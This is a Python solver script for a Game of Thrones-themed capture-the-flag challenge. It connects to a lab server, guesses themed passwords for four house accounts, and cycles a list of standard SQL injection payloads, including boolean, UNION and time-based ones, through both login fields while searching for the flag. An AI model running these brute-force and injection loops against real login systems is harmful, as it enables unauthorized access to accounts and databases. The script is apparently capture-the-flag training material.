#!/usr/bin/env python3
"""
The Iron Bank Heist - SQL Injection Challenge
Houses: Lannister, Stark, Targaryen, Greyjoy
Hint: "written before the great schism of escaped quotes" - SQL injection
Tip: "a friend from the Watch left you a phrase"
"""

import socket
import time
import re

def connect_to_bank():
    """Connect to The Iron Bank of Braavos"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30048))
    time.sleep(0.5)
    return s

def try_basic_interaction():
    """Try basic interaction to understand the interface"""
    print("[+] Trying basic interaction...")
    
    try:
        s = connect_to_bank()
        
        # Get initial response
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"[+] Initial response:\n{response}")
        
        # Try help command
        s.sendall(b"help\n")
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"[+] Help response:\n{response}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in basic interaction: {e}")

def try_house_logins():
    """Try logging in with each house and common passwords"""
    print("[+] Trying house logins...")
    
    houses = ["Lannister", "Stark", "Targaryen", "Greyjoy"]
    
    # Common Game of Thrones passwords
    passwords = [
        "gold",
        "winter",
        "fire",
        "iron",
        "Winter is Coming",
        "Hear Me Roar",
        "Fire and Blood",
        "We Do Not Sow",
        "A Lannister Always Pays His Debts",
        "The North Remembers",
        "Dracarys",
        "What is Dead May Never Die",
        "Valar Morghulis",
        "Valar Dohaeris",
        "Night gathers, and now my watch begins",  # Night's Watch phrase
        "I am the sword in the darkness",
        "I am the watcher on the walls",
        "I pledge my life and honor to the Night's Watch",
        "And now my watch begins",
        "For the Watch",
        "The Wall",
        "Castle Black",
        "Jon Snow",
        "Lord Commander",
    ]
    
    for house in houses:
        print(f"\n[+] Trying house: {house}")
        
        for password in passwords:
            try:
                s = connect_to_bank()
                
                # Get initial prompt
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                # Try login
                login_attempt = f"{house}\n{password}\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house}:{password}: {flag}")
                        s.close()
                        return True
                
                # Check for success indicators
                success_indicators = ["vault", "gold", "welcome", "access granted", "authenticated"]
                if any(indicator.lower() in response.lower() for indicator in success_indicators):
                    print(f"[!] Potential success with {house}:{password}")
                    print(f"    Response: {response}")
                
                s.close()
                
            except Exception as e:
                print(f"    Error with {house}:{password}: {e}")
    
    return False

def try_sql_injection():
    """Try SQL injection attacks"""
    print("[+] Trying SQL injection attacks...")
    
    houses = ["Lannister", "Stark", "Targaryen", "Greyjoy"]
    
    # SQL injection payloads
    sqli_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin'#",
        "' OR 'a'='a",
        "' UNION SELECT 1--",
        "' UNION SELECT NULL--",
        "' OR ''='",
        "' OR 1=1 LIMIT 1--",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1",
        "' OR 1=1 AND '1'='1",
        "' OR 'x'='x",
        "1' OR '1'='1",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "' OR sleep(5)--",
        "' OR 1=1 WAITFOR DELAY '00:00:05'--",
    ]
    
    for house in houses:
        print(f"\n[+] Trying SQL injection with house: {house}")
        
        for payload in sqli_payloads:
            try:
                s = connect_to_bank()
                
                # Get initial prompt
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                # Try SQL injection in username
                login_attempt = f"{house}{payload}\npassword\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house}{payload}: {flag}")
                        s.close()
                        return True
                
                # Check for SQL injection success indicators
                if any(indicator in response.lower() for indicator in ["vault", "gold", "welcome", "access", "authenticated", "login successful"]):
                    print(f"[!] Potential SQLi success with {house}{payload}")
                    print(f"    Response: {response}")
                
                s.close()
                
                # Also try SQL injection in password field
                s = connect_to_bank()
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                login_attempt = f"{house}\n{payload}\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house} password {payload}: {flag}")
                        s.close()
                        return True
                
                s.close()
                
            except Exception as e:
                print(f"    Error with {house}{payload}: {e}")
    
    return False

def try_nights_watch_phrases():
    """Try Night's Watch specific phrases as mentioned in the hint"""
    print("[+] Trying Night's Watch phrases...")
    
    houses = ["Lannister", "Stark", "Targaryen", "Greyjoy"]
    
    # Night's Watch oath and phrases
    nights_watch_phrases = [
        "Night gathers, and now my watch begins",
        "I am the sword in the darkness",
        "I am the watcher on the walls", 
        "I am the fire that burns against the cold",
        "I am the light that brings the dawn",
        "I am the horn that wakes the sleepers",
        "I am the shield that guards the realms of men",
        "I pledge my life and honor to the Night's Watch",
        "for this night and all the nights to come",
        "And now my watch begins",
        "For the Watch",
        "The Wall protects us all",
        "Castle Black",
        "Lord Commander",
        "The Night's Watch",
        "Black Brothers",
        "Crow",
        "The Wall",
        "Beyond the Wall",
        "White Walkers",
        "The Others",
        "Jon Snow knows nothing",
        "You know nothing",
        "Winter is coming",
        "The North remembers",
        "Bastard of Winterfell",
        "King in the North",
    ]
    
    for house in houses:
        print(f"\n[+] Trying Night's Watch phrases with house: {house}")
        
        for phrase in nights_watch_phrases:
            try:
                s = connect_to_bank()
                
                # Get initial prompt
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                # Try the phrase as password
                login_attempt = f"{house}\n{phrase}\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house}:{phrase}: {flag}")
                        s.close()
                        return True
                
                # Check for success indicators
                if any(indicator in response.lower() for indicator in ["vault", "gold", "welcome", "access", "authenticated"]):
                    print(f"[!] Potential success with {house}:{phrase}")
                    print(f"    Response: {response}")
                
                s.close()
                
            except Exception as e:
                print(f"    Error with {house}:{phrase}: {e}")
    
    return False

def try_combined_attacks():
    """Try combining SQL injection with Night's Watch phrases"""
    print("[+] Trying combined SQL injection + Night's Watch phrases...")
    
    houses = ["Lannister", "Stark", "Targaryen", "Greyjoy"]
    
    # Combine SQL injection with Night's Watch context
    combined_payloads = [
        "' OR 'Night gathers'='Night gathers",
        "' OR 'watch'='watch",
        "' OR 'Jon Snow'='Jon Snow",
        "' OR 'Castle Black'='Castle Black",
        "' OR 'The Wall'='The Wall",
        "' OR 'For the Watch'='For the Watch",
        "Jon Snow' OR '1'='1",
        "Castle Black' OR '1'='1",
        "Night Watch' OR '1'='1",
        "The Wall' OR '1'='1",
        "' UNION SELECT 'Night gathers'--",
        "' UNION SELECT 'For the Watch'--",
    ]
    
    for house in houses:
        for payload in combined_payloads:
            try:
                s = connect_to_bank()
                
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                # Try as username
                login_attempt = f"{house}{payload}\npassword\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house}{payload}: {flag}")
                        s.close()
                        return True
                
                s.close()
                
                # Try as password
                s = connect_to_bank()
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                
                login_attempt = f"{house}\n{payload}\n"
                s.sendall(login_attempt.encode())
                time.sleep(1)
                
                response = s.recv(4096).decode('utf-8', errors='ignore')
                
                if "SpaceCTF{" in response:
                    flag_match = re.search(r'SpaceCTF\{[^}]+\}', response)
                    if flag_match:
                        flag = flag_match.group(0)
                        print(f"\n🎉 FLAG FOUND with {house} password {payload}: {flag}")
                        s.close()
                        return True
                
                s.close()
                
            except Exception as e:
                print(f"    Error with {house}:{payload}: {e}")
    
    return False

def main():
    print("="*70)
    print("THE IRON BANK HEIST - SQL INJECTION CHALLENGE")
    print("Houses: Lannister, Stark, Targaryen, Greyjoy")
    print("Hint: Ancient software with escaped quotes vulnerability")
    print("Tip: Friend from the Watch left a phrase")
    print("="*70)
    
    # Try basic interaction first
    try_basic_interaction()
    
    # Try legitimate house logins with common passwords
    if try_house_logins():
        return
    
    # Try Night's Watch phrases (the hint)
    if try_nights_watch_phrases():
        return
    
    # Try SQL injection
    if try_sql_injection():
        return
    
    # Try combined attacks
    if try_combined_attacks():
        return
    
    print("\n❌ All attack methods failed")
    print("The challenge might require a different approach or specific phrase")

if __name__ == "__main__":
    main()